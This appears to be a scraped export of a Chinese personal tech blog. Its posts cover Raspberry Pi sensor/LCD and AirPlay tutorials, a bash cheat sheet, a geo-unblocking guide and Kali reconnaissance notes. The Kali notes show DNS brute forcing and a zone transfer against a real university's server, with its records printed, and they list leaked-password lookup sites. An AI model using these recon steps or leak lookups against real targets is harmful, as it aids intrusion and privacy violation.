在淘宝上网购了原料之后，回家发现网上并没有树莓派3B的教程，大部分都是树莓派2B的教程，而树莓派3B的GPIO图都发生了变化，因此写本文的目的还在于帮助更多的人，填补互联网的空白。","text":"前言很早就入了树莓派，一直没有折腾GPIO功能，虽然我是学自动化的，但是我对引脚之类的一窍不通，做这个也是为了预习一下本专业的知识，而更多的，是乐趣。 在淘宝上网购了原料之后，回家发现网上并没有树莓派3B的教程，大部分都是树莓派2B的教程，而树莓派3B的GPIO图都发生了变化，因此写本文的目的还在于帮助更多的人，填补互联网的空白。 知识储备 数字电子技术基础 微机原理与接口技术 python语言 原料 树莓派3B DHT11 LCD1602 2K电阻（也可以是电位器） 子-母 和 母-母 杜邦线 电气绝缘胶带 剪刀 一颗耐心和一颗细心 语言 Python 2.7 组件 python-dev python-rpi.gpio如果不具备以上，请执行：123sudo apt-get updatesudo apt-get install python-devsudo apt-get install python-rpi.gpio 接线我们一共要完成两个任务： 1.连接LCD1602 2.连接DHT11 树莓派3B的GPIO图如下： 2K 电阻如何连接到电路简单粗暴的方法就是把电阻两头连接到两个子-母杜邦线上，然后用绝缘胶布缠上，非常方便美观。 LCD1602 接线方案LCD 与 树莓派相连 方案图，2K电阻是我自行设计，如果有电位器最好放置电位器： 树莓派的USB端口朝下，电源线位置朝上方向摆放。右端一共有40个引脚，每个引脚的PIN位置如上。 VSS，接地，RPi PIN 6VDD，接5V电源，PRi PIN 2VO，液晶对比度调节，接1K 电阻，另一端相连接地，PIN 9RS，寄存器选择，接GPIO 14，RPi PIN 8RW，读写选择，接地，表示写模式，PRi PIN 6E，使能信号，接GPIO 15，RPi PIN 10D0，数据位0，4位工作模式下不用，不接D1，数据位1，4位工作模式下不用，不接D2，数据位2，4位工作模式下不用，不接D3，数据位3，4位工作模式下不用，不接D4，数据位4，接GPIO 17，RPi PIN 11D5，数据位5，接GPIO 18，RPi PIN 12D6，数据位6，接GPIO 27，RPi PIN 13D7，数据位7，接GPIO 22，RPi PIN 15A，液晶屏背光+，接5V，RPi PIN 4K，液晶屏背光-，接地，RPi PIN 39 连接好后，务必要仔细检查是否连接正确，以防开机烧坏GPIO甚至树莓派。 建议在关机情况下接线，如果在开机情况下接线，VDD请最后连接。 LCD1602 开机测试接通电源线，默认情况下，如果连接正确： 肯定没有爆炸 会出现如下图的效果，证明你已经接线成功了 DHT11 接线方案接线简单，主要是把数据传输到GPIO26上 DHT11有3个脚，VCC，DATA，GNDVCC 接 3.3V PIN 01DATA 接 GPIO26 PIN 37GND 接地 PIN 09 #代码采用python语言编写，由于html对tab和空格的支持不好，复制容易产生编译问题，代码已经传到github https://github.com/yfgeek/rpi-TmpHmdRuntime123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332#!/usr/bin/python# based on code from hugozhu/CharLCD.py https://gist.github.com/hugozhu/6166527# rewrite by ivanfrom time import sleepfrom datetime import datetimefrom time import sleepimport commands,timeimport RPi.GPIO as GPIOdef get_tmp(): channel = 37 data = [] j = 0 GPIO.setmode(GPIO.BOARD) time.sleep(1) GPIO.setup(channel, GPIO.OUT) GPIO.output(channel, GPIO.LOW) time.sleep(0.5) GPIO.output(channel, GPIO.HIGH) GPIO.setup(channel, GPIO.IN) while GPIO.input(channel) == GPIO.LOW: continue while GPIO.input(channel) == GPIO.HIGH: continue while j &lt; 40: k = 0 while GPIO.input(channel) == GPIO.LOW: continue while GPIO.input(channel) == GPIO.HIGH: k += 1 if k &gt; 100: break if k &lt; 8: data.append(0) else: data.append(1) j += 1 print \"sensor is working.\" print data humidity_bit = data[0:8] humidity_point_bit = data[8:16] temperature_bit = data[16:24] temperature_point_bit = data[24:32] check_bit = data[32:40] humidity = 0 humidity_point = 0 temperature = 0 temperature_point = 0 check = 0 for i in range(8): humidity += humidity_bit[i] * 2 ** (7-i) humidity_point += humidity_point_bit[i] * 2 ** (7-i) temperature += temperature_bit[i] * 2 ** (7-i) temperature_point += temperature_point_bit[i] * 2 ** (7-i) check += check_bit[i] * 2 ** (7-i) tmp = humidity + humidity_point + temperature + temperature_point if check == tmp: return 'temp:' + str(temperature) + ' C \\nhumidity:' + str(humidity) + '%' else: get_tmp() GPIO.cleanup() class Adafruit_CharLCD: # commands LCD_CLEARDISPLAY = 0x01 LCD_RETURNHOME = 0x02 LCD_ENTRYMODESET = 0x04 LCD_DISPLAYCONTROL = 0x08 LCD_CURSORSHIFT = 0x10 LCD_FUNCTIONSET = 0x20 LCD_SETCGRAMADDR = 0x40 LCD_SETDDRAMADDR = 0x80 # flags for display entry mode LCD_ENTRYRIGHT = 0x00 LCD_ENTRYLEFT = 0x02 LCD_ENTRYSHIFTINCREMENT = 0x01 LCD_ENTRYSHIFTDECREMENT = 0x00 # flags for display on/off control LCD_DISPLAYON = 0x04 LCD_DISPLAYOFF = 0x00 LCD_CURSORON = 0x02 LCD_CURSOROFF = 0x00 LCD_BLINKON = 0x01 LCD_BLINKOFF = 0x00 # flags for display/cursor shift LCD_DISPLAYMOVE = 0x08 LCD_CURSORMOVE = 0x00 # flags for display/cursor shift LCD_DISPLAYMOVE = 0x08 LCD_CURSORMOVE = 0x00 LCD_MOVERIGHT = 0x04 LCD_MOVELEFT = 0x00 # flags for function set LCD_8BITMODE = 0x10 LCD_4BITMODE = 0x00 LCD_2LINE = 0x08 LCD_1LINE = 0x00 LCD_5x10DOTS = 0x04 LCD_5x8DOTS = 0x00 def __init__(self, pin_rs=8, pin_e=10, pins_db=[11,12,13,15], GPIO = None): # Emulate the old behavior of using RPi.GPIO if we haven't been given # an explicit GPIO interface to use if not GPIO: import RPi.GPIO as GPIO GPIO.setwarnings(False) self.GPIO = GPIO self.pin_rs = pin_rs self.pin_e = pin_e self.pins_db = pins_db self.GPIO.setmode(GPIO.BOARD) self.GPIO.setup(self.pin_e, GPIO.OUT) self.GPIO.setup(self.pin_rs, GPIO.OUT) for pin in self.pins_db: self.GPIO.setup(pin, GPIO.OUT) self.write4bits(0x33) # initialization self.write4bits(0x32) # initialization self.write4bits(0x28) # 2 line 5x7 matrix self.write4bits(0x0C) # turn cursor off 0x0E to enable cursor self.write4bits(0x06) # shift cursor right self.displaycontrol = self.LCD_DISPLAYON | self.LCD_CURSOROFF | self.LCD_BLINKOFF self.displayfunction = self.LCD_4BITMODE | self.LCD_1LINE | self.LCD_5x8DOTS self.displayfunction |= self.LCD_2LINE \"\"\" Initialize to default text direction (for romance languages) \"\"\" self.displaymode = self.LCD_ENTRYLEFT | self.LCD_ENTRYSHIFTDECREMENT self.write4bits(self.LCD_ENTRYMODESET | self.displaymode) # set the entry mode self.clear() def begin(self, cols, lines): if (lines &gt; 1): self.numlines = lines self.displayfunction |= self.LCD_2LINE self.currline = 0 def home(self): self.write4bits(self.LCD_RETURNHOME) # set cursor position to zero self.delayMicroseconds(3000) # this command takes a long time! def clear(self): self.write4bits(self.LCD_CLEARDISPLAY) # command to clear display self.delayMicroseconds(3000) # 3000 microsecond sleep, clearing the display takes a long time def setCursor(self, col, row): self.row_offsets = [ 0x00, 0x40, 0x14, 0x54 ] if ( row &gt; self.numlines ): row = self.numlines - 1 # we count rows starting w/0 self.write4bits(self.LCD_SETDDRAMADDR | (col + self.row_offsets[row])) def noDisplay(self): \"\"\" Turn the display off (quickly) \"\"\" self.displaycontrol &amp;= ~self.LCD_DISPLAYON self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol) def display(self): \"\"\" Turn the display on (quickly) \"\"\" self.displaycontrol |= self.LCD_DISPLAYON self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol) def noCursor(self): \"\"\" Turns the underline cursor on/off \"\"\" self.displaycontrol &amp;= ~self.LCD_CURSORON self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol) def cursor(self): \"\"\" Cursor On \"\"\" self.displaycontrol |= self.LCD_CURSORON self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol) def noBlink(self): \"\"\" Turn on and off the blinking cursor \"\"\" self.displaycontrol &amp;= ~self.LCD_BLINKON self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol) def noBlink(self): \"\"\" Turn on and off the blinking cursor \"\"\" self.displaycontrol &amp;= ~self.LCD_BLINKON self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol) def DisplayLeft(self): \"\"\" These commands scroll the display without changing the RAM \"\"\" self.write4bits(self.LCD_CURSORSHIFT | self.LCD_DISPLAYMOVE | self.LCD_MOVELEFT) def scrollDisplayRight(self): \"\"\" These commands scroll the display without changing the RAM \"\"\" self.write4bits(self.LCD_CURSORSHIFT | self.LCD_DISPLAYMOVE | self.LCD_MOVERIGHT); def leftToRight(self): \"\"\" This is for text that flows Left to Right \"\"\" self.displaymode |= self.LCD_ENTRYLEFT self.write4bits(self.LCD_ENTRYMODESET | self.displaymode); def rightToLeft(self): \"\"\" This is for text that flows Right to Left \"\"\" self.displaymode &amp;= ~self.LCD_ENTRYLEFT self.write4bits(self.LCD_ENTRYMODESET | self.displaymode) def autoscroll(self): \"\"\" This will 'right justify' text from the cursor \"\"\" self.displaymode |= self.LCD_ENTRYSHIFTINCREMENT self.write4bits(self.LCD_ENTRYMODESET | self.displaymode) def noAutoscroll(self): \"\"\" This will 'left justify' text from the cursor \"\"\" self.displaymode &amp;= ~self.LCD_ENTRYSHIFTINCREMENT self.write4bits(self.LCD_ENTRYMODESET | self.displaymode) def write4bits(self, bits, char_mode=False): \"\"\" Send command to LCD \"\"\" self.delayMicroseconds(1000) # 1000 microsecond sleep bits=bin(bits)[2:].zfill(8) self.GPIO.output(self.pin_rs, char_mode) for pin in self.pins_db: self.GPIO.output(pin, False) for i in range(4): if bits[i] == \"1\": self.GPIO.output(self.pins_db[::-1][i], True) self.pulseEnable() for pin in self.pins_db: self.GPIO.output(pin, False) for i in range(4,8): if bits[i] == \"1\": self.GPIO.output(self.pins_db[::-1][i-4], True) self.pulseEnable() def delayMicroseconds(self, microseconds): seconds = microseconds / float(1000000) # divide microseconds by 1 million for seconds sleep(seconds) def pulseEnable(self): self.GPIO.output(self.pin_e, False) self.delayMicroseconds(1) # 1 microsecond pause - enable pulse must be &gt; 450ns self.GPIO.output(self.pin_e, True) self.delayMicroseconds(1) # 1 microsecond pause - enable pulse must be &gt; 450ns self.GPIO.output(self.pin_e, False) self.delayMicroseconds(1) # commands need &gt; 37us to settle def message(self, text): \"\"\" Send string to LCD. Newline wraps to second line\"\"\" for char in text: if char == '\\n': self.write4bits(0xC0) # next line else: self.write4bits(ord(char),True)if __name__ == '__main__': while True: tmp = get_tmp() if tmp: lcd = Adafruit_CharLCD() lcd.noBlink() lcd.clear() lcd.message(tmp) sleep(5) 运行效果 参考资料https://gist.github.com/hugozhu/6166527https://github.com/adafruit/Adafruit-Raspberry-Pi-Python-Code/tree/2d4678fdccec1b93d8d69ba7768f6698545b2c5fhttps://github.com/op2-project/op2-daemon/blob/master/op2d/hal/backend/pihelpers/lcd.pyhttp://blog.csdn.net/xukai871105/article/details/12684617https://www.oschina.net/question/1425530\\_140979http://bbs.elecfans.com/jishu\\_578437\\_1\\_1.htmlhttp://blog.csdn.net/netccy/article/details/48098455https://www.6zou.net/tech/raspberry-pi-lcd1602-system-monitor.htmlhttp://hugozhu.myalert.info/2013/03/23/19-raspberry-pi-drive-1602-lcd.htmlhttp://hugozhu.myalert.info/2013/03/22/19-raspberry-pi-gpio-port-naming.htmlhttp://blog.csdn.net/rocklee/article/details/50082777http://www.guokr.com/post/718305/http://www.rs-online.com/designspark/electronics/blog/content-1148http://bbs.elecfans.com/jishu\\_582479\\_1\\_1.htmlhttps://www.freemindworld.com/blog/2013/130310\\_raspberry\\_pi\\_with\\_lcd.shtmlhttp://blog.csdn.net/u013431550/article/details/40870947http://www.shumeipai.net/thread-21026-1-1.html?_dsign=0e7b69bahttp://blog.csdn.net/longerzone/article/details/36171381","categories":[],"tags":[{"name":"Raspberry","slug":"Raspberry","permalink":"http://www.yfgeek.com/tags/Raspberry/"}],"keywords":[]},{"title":"我怀念的依旧是916","slug":"916","date":"2016-08-20T15:22:01.000Z","updated":"2016-08-20T17:09:45.000Z","comments":true,"path":"2016/08/20/916/","link":"","permalink":"http://www.yfgeek.com/2016/08/20/916/","excerpt":"本文是一个纪念性文章。前天看了一个微电影，忽然想起了母校，十分想念，最想念的，仍然是916。 所谓916，就是图书馆9楼916号，这是我大二大三的美好时光。 916桌子很多，却都是空位，但是有基友陪伴。","text":"本文是一个纪念性文章。前天看了一个微电影，忽然想起了母校，十分想念，最想念的，仍然是916。 所谓916，就是图书馆9楼916号，这是我大二大三的美好时光。 916桌子很多，却都是空位，但是有基友陪伴。 916有dong dong dong，充满回忆。 916从来不用占座，却可以假装学习。 916通宵加零食，空调WI-FI感觉人生圆满了。 916有沙发有地铺，住在学校里的快捷酒店。 916极大地方便了生活，Linux的帮忙少不了。 或许我想念的并不是不太优越的办公环境，而是那种感觉。 炎热的夏天，能有一个办公室开着空调看电影通宵，再有个基友聊聊天，简直完美。 自由自在，想做什么做什么。 当然，我也不会忘记， 偷偷的把被子塞到书包里，绕过防火墙的经历； 第二天起床去厕所刷牙碰到老师，被吓住的心情； 晚上十一点半有人巡查，关闭所有光源，假装没人的感觉； 十点后进入害怕遇到搜查，爬九楼的故事； 隔壁传来的dongdongdong声音和30GB的故事。","categories":[],"tags":[{"name":"杂谈","slug":"杂谈","permalink":"http://www.yfgeek.com/tags/杂谈/"}],"keywords":[]},{"title":"海外App生存指南","slug":"hai-wai-appsheng-cun-zhi-nan","date":"2016-08-12T15:13:34.000Z","updated":"2016-08-12T15:30:50.000Z","comments":true,"path":"2016/08/12/hai-wai-appsheng-cun-zhi-nan/","link":"","permalink":"http://www.yfgeek.com/2016/08/12/hai-wai-appsheng-cun-zhi-nan/","excerpt":"","text":"DNS/PAC大法优酷土豆爱奇艺在 iOS 的 Wi-Fi 设置当中，点进某个 Wi-Fi 的属性页面，拖到最下面设置「HTTP 代理」-「自动」为：1http://pac.uku.im/pac.pac DNS:1158.69.209.100 更新：https://github.com/uku/Unblock-Youku/issues/618 替换hosts大法网易云音乐1234567891011104.236.189.178 http://music.163.com 198.47.104.134 http://m1.music.126.net 198.47.104.134 http://m2.music.126.net 198.47.104.134 http://m3.music.126.net 198.47.104.134 http://m4.music.126.net198.47.104.134 http://m5.music.126.net 198.47.104.134 http://m6.music.126.net 198.47.104.134 http://m7.music.126.net 198.47.104.134 http://m8.music.126.net 198.47.104.134 http://m9.music.126.net 198.47.104.134 http://m10.music.126.net","categories":[],"tags":[{"name":"其他","slug":"其他","permalink":"http://www.yfgeek.com/tags/其他/"}],"keywords":[]},{"title":"用树莓派把蓝牙音响变成Airplay音响","slug":"airplay","date":"2016-08-07T13:23:56.000Z","updated":"2016-08-07T15:28:30.000Z","comments":true,"path":"2016/08/07/airplay/","link":"","permalink":"http://www.yfgeek.com/2016/08/07/airplay/","excerpt":"前言最近买了小米蓝牙音响，使用一段时间后发现小米蓝牙音箱有一个极其不方便的地方就是家里苹果设备比较多，想切换设备播放的时候就比较麻烦，还要断开操作。于是萌生了一个想法，正好手上有个树莓派，能不能这样： iOS设备-&gt;Airplay-&gt;树莓派-&gt;蓝牙-&gt;小米蓝牙音箱","text":"前言最近买了小米蓝牙音响，使用一段时间后发现小米蓝牙音箱有一个极其不方便的地方就是家里苹果设备比较多，想切换设备播放的时候就比较麻烦，还要断开操作。于是萌生了一个想法，正好手上有个树莓派，能不能这样： iOS设备-&gt;Airplay-&gt;树莓派-&gt;蓝牙-&gt;小米蓝牙音箱 因此这个问题可以分为两个部分： 1.树莓派蓝牙音频配置部分 2.树莓派Airplay播放部分 在解决这个问题的时候，我走了不少弯路，错路，目前网上没有完整的这个问题的解决方案，此文目的正是填补网络空白。 原料 树莓派3 小米蓝牙音箱 iOS设备 开始树莓派安装Shairport SyncShairport Sync实际上是Shairport的修改版，负责让树莓派发射出稳定的Airplay，之前我一直在使用Shairport，偶然间发现这个神器，让Shairport更加稳定好用，而且加入到系统进程，开机即打开Airplay。安装前请确认是否安装以下依赖包： apt-get install build-essential git apt-get install autoconf automake libtool libdaemon-dev libasound2-dev libpopt-dev libconfig-dev apt-get install avahi-daemon libavahi-client-dev apt-get install libssl-dev apt-get install libpolarssl-dev apt-get install libsoxr-dev 随后下载Shairport Sync：1git clone https://github.com/mikebrady/shairport-sync.git 然后cd到相应目录，执行：1autoreconf -i -f 随后执行：1./configure --with-alsa --with-avahi --with-ssl=openssl --with-metadata --with-soxr --with-systemd 如果没问题的话，可以make了，此时该去洗手间去洗手间，该睡觉睡觉：1make 创建开机启动：123getent group shairport-sync &amp;&gt;/dev/null || sudo groupadd -r shairport-sync &gt;/dev/nullgetent passwd shairport-sync &amp;&gt; /dev/null || sudo useradd -r -M -g shairport-sync -s /usr/bin/nologin -G audio shairport-sync &gt;/dev/null 然后运行：1sudo make install 最后输入，完成安装：1sudo update-rc.d shairport-sync defaults 90 10 树莓派安装蓝牙打开终端，用普通用户权限执行：123sudo apt-get updatesudo apt-get updgrade -ysudo apt-get dist-upgrade -y 随后安装蓝牙及管理软件1sudo apt-get install pi-bluetooth bluez bluez-firmware blueman 将pi用户添加到蓝牙组1sudo usermod -G bluetooth -a pi 还有很重要的一条，安装蓝牙音频配置1sudo apt-get install pulseaudio pulseaudio-module-bluetooth 随后重启一次树莓派，开机，在图形化界面中配对蓝牙，操作比较简单，记得在配对成功后对设备进行连接，省略。也可通过bluetoothctl或hictool命令进行配对。随后记下蓝牙设备的地址，XX:XX:XX:XX:XX:XX格式。 在此步，务必通过测试音频是否能够正常与蓝牙设备通信，记得软件中要勾选蓝牙设备，否则将从3.5mm端口输出音频。推荐使用vlc播放器。 配置蓝牙音频及Shariport Sync安装依赖包：1234sudo apt-get install libdbus-1-devsudo apt-get install libglib2.0-devapt-cache search libasoundsudo apt-get install libasound2-dev 配置及重新安装最新版bluez，此刻可以去洗手间和睡觉觉：123456wget http://www.kernel.org/pub/linux/bluetooth/bluez-4.101.tar.xztar -xvf bluez-4.101.tar.xzcd bluez-4.101./configure --prefix=/usr --mandir=/usr/share/man --sysconfdir=/etc --localstatedir=/var --libexecdir=/libmakesudo make install 复制配置文件到目录：1234sudo cp /home/pi/bluez-4.101/test/simple-agent /usr/bin/bluez-simple-agentsudo cp /home/pi/bluez-4.101/test/test-device /usr/bin/bluez-test-devicesudo cp /home/pi/bluez-4.101/test/test-audio /usr/bin/bluez-test-audiosudo cp /home/pi/bluez-4.101/audio/audio.conf /etc/bluetooth/ 接着运行：123sudo apt-get install python-dbussudo apt-get install python-gobjectsudo cp /usr/lib/alsa-lib/libasound_module_pcm_bluetooth.so /usr/lib/arm-linux-gnueabihf/alsa-lib/ 编辑audio.conf文件使shariport的音频从蓝牙设备输出：1sudo nano /etc/bluetooth/audio.conf 1234# 在[General]区域添加:Enable=Sink,Socket# 取消[A2DP]注释，并加入:Maxconnections=4 打开蓝牙自启动:1sudo systemctl enable bluetooth 重启设备后，继续配置，打开asund.conf文件：1sudo nano /etc/asound.conf 1234567891011121314151617pcm.bt_canz &#123;type plugslave &#123;pcm &#123;type bluetoothdevice XX:XX:XX:XX:XX:XXprofile \"auto\"&#125;&#125;hint &#123;show ondescription \"Mi Speaker\"&#125;&#125;ctl.bt_canz &#123;type bluetooth&#125; 测试bluez能否使用：sudo bluez-simple-agent，如果正常，按ctrl+c停止。12sudo bluez-simple-agent hci0 XX:XX:XX:XX:XX:XXsudo bluez-test-audio connect XX:XX:XX:XX:XX:XX 测试是否连通：speaker-test -c 2 -D bt_canz 再次重启设备。开启后编辑/etc/shairport-sync.conf：123sudo nano /etc/shairport-sync.conf#去掉下面的注释，并加入bt_canzoutput_device = bt_canz 保存！重启！开机即可用。 参考文章https://github.com/mikebrady/shairport-sync/issues/200https://github.com/mikebrady/shairport-synchttp://shumeipai.nxez.com/2014/12/10/raspberry-pi-using-airplay-wireless-audio-playback-achieve-even-putting-wifi.htmlhttp://wangye.org/blog/archives/921/http://blog.csdn.net/huayucong/article/details/51376461http://blog.csdn.net/zhaoqi_0612/article/details/47731821http://blog.csdn.net/techtitan/article/details/6165116http://www.eeboard.com/bbs/forum.php?mod=viewthread&amp;tid=45040&amp;page=1","categories":[],"tags":[{"name":"Raspberry","slug":"Raspberry","permalink":"http://www.yfgeek.com/tags/Raspberry/"}],"keywords":[]},{"title":"常用Bash命令总结","slug":"bash","date":"2016-08-05T16:36:19.000Z","updated":"2016-08-06T03:15:29.000Z","comments":true,"path":"2016/08/06/bash/","link":"","permalink":"http://www.yfgeek.com/2016/08/06/bash/","excerpt":"自从入了Mac后，感觉敲命令更加方便了，对于我这种半吊子青年，一直号称不会写脚本的前端不是好美工，总结了一些命令，仅供参考，省去了最简单的命令，不过部分也比较简单：","text":"自从入了Mac后，感觉敲命令更加方便了，对于我这种半吊子青年，一直号称不会写脚本的前端不是好美工，总结了一些命令，仅供参考，省去了最简单的命令，不过部分也比较简单： 日常 ctrl + a #命令跳转到句首 ctrl + r #命令搜索模式 TAB #命令自动补全 pwd #显示当前路径 tar -cvf mytest.tar mytest/ #对mytest目录打包 tar -xvf mytest.tar #解压tar文件 tar -xvf mytest.tar -C /opt/setups/ #解压到特殊目录 find / -name *.conf #查找/下的所有conf文件 du -sh ./* #查看当前文件夹下的空间占用情况 more #分页查看 which #查看目录 locate #快速搜索 安全 who #当前登录情况 last #最近登录情况 cat /etc/passwd |awk -F \\: &#39;{print $1}&#39; #系统所有用户 chkconfig #启动项检查 netstat -lnp #端口情况 uptime #系统开机多久了 sudo iptables -A INPUT -p tcp -m tcp --dport 80 -j ACCEPT #允许访问 80 端口 一句话命令脚本中切换用户1su - test -c \"pwd\" 连接到你服务器端口的ip1netstat -tun|grep 7890|sort|awk '&#123;print $5&#125;'|cut -d : -f 1|uniq 常用功能#定时任务使用-l参数列出crontab文件:1crontab -l 编辑crontab文件1crontab -e 实例1：每1分钟执行一次myCommand1* * * * * myCommand 实例2：每小时的第3和第15分钟执行13,15 * * * * myCommand 实例3：在上午8点到11点的第3和第15分钟执行13,15 8-11 * * * myCommand 实例4：每隔两天的上午8点到11点的第3和第15分钟执行13,15 8-11 */2 * * myCommand 实例5：每周一上午8点到11点的第3和第15分钟执行13,15 8-11 * * 1 myCommand 实例6：每晚的21:30重启smb130 21 * * * /etc/init.d/smb restart 实例7：每月1、10、22日的4 : 45重启smb145 4 1,10,22 * * /etc/init.d/smb restart 实例8：每周六、周日的1 : 10重启smb110 1 * * 6,0 /etc/init.d/smb restart 实例9：每天18 : 00至23 : 00之间每隔30分钟重启smb10,30 18-23 * * * /etc/init.d/smb restart 实例10：每星期六的晚上11 : 00 pm重启smb10 23 * * 6 /etc/init.d/smb restart 实例11：每一小时重启smb1* */1 * * * /etc/init.d/smb restart 实例12：晚上11点到早上7点之间，每隔一小时重启smb1* 23-7/1 * * * /etc/init.d/smb restart #scp实例1：从远处复制文件到本地目录1scp root@10.6.159.147:/opt/soft/demo.tar /opt/soft/ 说明：从10.6.159.147机器上的/opt/soft/的目录中下载demo.tar 文件到本地/opt/soft/目录中 实例2：从远处复制到本地1scp -r root@10.6.159.147:/opt/soft/test /opt/soft/ 说明：从10.6.159.147机器上的/opt/soft/中下载test目录到本地的/opt/soft/目录来。 实例3：上传本地文件到远程机器指定目录1scp /opt/soft/demo.tar root@10.6.159.147:/opt/soft/scptest 说明：复制本地opt/soft/目录下的文件demo.tar 到远程机器10.6.159.147的opt/soft/scptest目录 实例4：上传本地目录到远程机器指定目录1scp -r /opt/soft/test root@10.6.159.147:/opt/soft/scptest 说明：上传本地目录 /opt/soft/test到远程机器10.6.159.147上/opt/soft/scptest的目录中","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://www.yfgeek.com/tags/Linux/"}],"keywords":[]},{"title":"Kali系列——信息收集阶段（二）","slug":"kalixi-lie-xin-xi-shou-ji-jie-duan-yi","date":"2016-08-01T15:20:17.000Z","updated":"2016-08-05T13:13:14.000Z","comments":true,"path":"2016/08/01/kalixi-lie-xin-xi-shou-ji-jie-duan-yi/","link":"","permalink":"http://www.yfgeek.com/2016/08/01/kalixi-lie-xin-xi-shou-ji-jie-duan-yi/","excerpt":"","text":"fierece暴力破解dns解析12345678910root@kali:~# fierce -dns dbstye.netTrying zone transfer first...Unsuccessful in zone transfer (it was worth a shot)Okay, trying the good old fashioned way... brute forceChecking for wildcard DNS...Nope. Good.Now performing 2280 test(s)... 应用字典 1root@kali:~# fierce -dns dbstye.net -wordlist myWordlist.txt 社工库部分需翻墙 http://www.xiumima.com/ http://cha.hxsec.com/ http://findmima.com http://163.donothackme.club/ http://www.rallyindonesia.com/","categories":[],"tags":[{"name":"Hack","slug":"Hack","permalink":"http://www.yfgeek.com/tags/Hack/"}],"keywords":[]},{"title":"Kali系列——信息收集阶段（一）","slug":"hack1","date":"2016-07-30T09:48:20.000Z","updated":"2016-08-05T13:13:28.000Z","comments":true,"path":"2016/07/30/hack1/","link":"","permalink":"http://www.yfgeek.com/2016/07/30/hack1/","excerpt":"记得前几周去参加过一个阿里巴巴举办的安全峰会，其中一个大牛讲到以前的渗透测试三字经，当场真是笑出声： 进谷歌 找注入 没注入 就旁注 没旁注 用0day 没0day 猜目录 没目录 就嗅探 爆账户 找后台 传小马 放大马 拿权限 挂页面 放暗连 清数据 拿不下 去自杀 死不了 继续来 查资料 去社工！ 其实，我觉得渗透测试无论怎么变，不外乎这几点： 信息收集阶段-&gt;漏洞检测阶段-&gt;漏洞利用阶段-&gt;持久化后门阶段 最近借了本好书《高度安全环境下的高级渗透测试》，这本书内容浅显易懂，但却很实用，虽然很多内容都知道，但是不成系统，这本书总结工作做得非常好，总结一下读书笔记。","text":"记得前几周去参加过一个阿里巴巴举办的安全峰会，其中一个大牛讲到以前的渗透测试三字经，当场真是笑出声： 进谷歌 找注入 没注入 就旁注 没旁注 用0day 没0day 猜目录 没目录 就嗅探 爆账户 找后台 传小马 放大马 拿权限 挂页面 放暗连 清数据 拿不下 去自杀 死不了 继续来 查资料 去社工！ 其实，我觉得渗透测试无论怎么变，不外乎这几点： 信息收集阶段-&gt;漏洞检测阶段-&gt;漏洞利用阶段-&gt;持久化后门阶段 最近借了本好书《高度安全环境下的高级渗透测试》，这本书内容浅显易懂，但却很实用，虽然很多内容都知道，但是不成系统，这本书总结工作做得非常好，总结一下读书笔记。 信息收集阶段DNS信息其实DNS信息收集阶段用两个Linux系统自带工具即可完成。 nslookup此命令，可以快速查处ip地址1234567 ✘ ivan@Ivan~ nslookup zhihu.comServer: 114.114.114.114Address: 114.114.114.114#53Non-authoritative answer:Name: zhihu.comAddress: 54.223.189.245 当然也可以指定dns查询服务器：123456789ivan@Ivan ~ nslookup -type=ns zhihu.com 8.8.8.8Server: 8.8.8.8Address: 8.8.8.8#53Non-authoritative answer:zhihu.com nameserver = ns3.dnsv4.com.zhihu.com nameserver = ns4.dnsv4.com.Authoritative answers can be found from: digdig真是个好工具，甚至可以找出DNS域传送漏洞。下面举一个例子，也是乌云网曝光过的，由于篇幅问题，精简了很多内容：1234567891011121314151617181920212223242526272829303132333435ivan@Ivan  ~  dig @dns.csust.edu.cn csust.edu.cn axfr; &lt;&lt;&gt;&gt; DiG 9.8.3-P1 &lt;&lt;&gt;&gt; @dns.csust.edu.cn csust.edu.cn axfr; (1 server found);; global options: +cmdcsust.edu.cn. 86400 IN SOA dns.csust.edu.cn. root.localhost.csust.edu.cn. 20160725 28800 7200 604800 86400csust.edu.cn. 86400 IN NS dns.csust.edu.cn.csust.edu.cn. 86400 IN NS dns2.csust.edu.cn.csust.edu.cn. 86400 IN A 113.240.233.146csust.edu.cn. 86400 IN A 210.43.192.8csust.edu.cn. 86400 IN A 210.43.192.18csust.edu.cn. 86400 IN MX 5 mxbiz1.qq.com.csust.edu.cn. 86400 IN MX 10 mxbiz2.qq.com.csust.edu.cn. 86400 IN AAAA 2001:da8:d002::d22b:c0083g.csust.edu.cn. 86400 IN A 113.240.233.6app.csust.edu.cn. 86400 IN A 113.240.233.11app7.csust.edu.cn. 86400 IN A 222.240.152.227app8.csust.edu.cn. 86400 IN A 113.240.233.8archives.csust.edu.cn. 86400 IN A 222.240.152.232bid.csust.edu.cn. 86400 IN CNAME jtcloud.csust.edu.cn.bw.csust.edu.cn. 86400 IN A 10.255.194.20cas.csust.edu.cn. 86400 IN A 210.43.198.1cslgqkzx.csust.edu.cn. 86400 IN A 210.43.188.80cslgxbsk.csust.edu.cn. 86400 IN CNAME cslgqkzx.csust.edu.cn.cslgxbzk.csust.edu.cn. 86400 IN CNAME cslgqkzx.csust.edu.cn.cwcx.csust.edu.cn. 86400 IN A 10.22.14.252cxlt.csust.edu.cn. 86400 IN A 222.240.152.203dkxnsyzx.csust.edu.cn. 86400 IN A 222.240.152.200dlkjxb.csust.edu.cn. 86400 IN CNAME cslgqkzx.csust.edu.cn.dns.csust.edu.cn. 86400 IN A 210.43.192.8csust.edu.cn. 86400 IN SOA dns.csust.edu.cn. root.localhost.csust.edu.cn. 20160725 28800 7200 604800 86400;; Query time: 62 msec;; SERVER: 210.43.192.8#53(210.43.192.8);; WHEN: Sat Jul 30 20:18:47 2016;; XFR size: 112 records (messages 1, bytes 2369) 